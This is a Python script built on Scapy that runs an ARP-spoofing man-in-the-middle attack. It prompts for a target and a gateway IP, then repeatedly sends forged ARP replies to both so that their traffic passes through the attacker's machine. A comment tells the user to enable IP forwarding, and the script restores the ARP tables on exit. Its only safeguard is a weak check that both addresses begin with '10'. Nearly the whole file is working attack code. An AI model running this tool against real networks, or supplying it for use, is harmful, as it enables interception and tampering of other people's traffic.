from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import time, os, sys
import argparse

# Must enable port forwarding
# /proc/sys/net/ipv4/ip_forward 0==>1


# Get mac address of computer
def get_mac(ip):
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src


# Tells target that we are the host
def spoof(target_ip, host_ip, verbose=True):
    # Get target's mac address
    target_mac = get_mac(target_ip)
    # ARP packet gives my info (ip/mac) to target. Using router ip but my own mac address so routed to me
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
    # Send the packet
    send(arp_response, verbose=0)
    if verbose:
        # Gets my mac address
        self_mac = ARP().hwsrc
        print('[+] Sent to {} : {} is-at {}'.format(target_ip, host_ip, self_mac))


# Reset the spoof to normal settings by sending correct packets
def restore(target_ip, host_ip, verbose=True):
    # Get target and host's mac addresses
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    # ARP packet gives my info (ip/mac) to target. Using router ip but my own mac address so routed to me
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
    # Send the packet 7 times (common practice)
    send(arp_response, verbose=0, count=7)
    if verbose:
        # Gets my mac address
        self_mac = ARP().hwsrc
        print('[+] Sent to {} : {} is-at {}'.format(target_ip, host_ip, host_mac))


# Prompt for victim's ip address
target = input('[+] What is your target\'s ip: ')

if target[:2] != "10":
    print("Do not attack this ip address.")
    exit(1)

# Gateway ip address
host = input('[+] What is your gateway\'s ip: ')

if target[:2] != "10" or host[:2] != "10":
    print("Do not attack this ip address.")
    exit(1)

# Should be verbose?
verbose = input('[+] Verbose? (y/n): ') == 'y'

try:
    while True:
        spoof(target, host, verbose)
        spoof(host, target, verbose)
        time.sleep(1)
except KeyboardInterrupt:
    print('[!] Detected CTRL+C ! restoring the network')
    restore(target, host)
    restore(host, target)

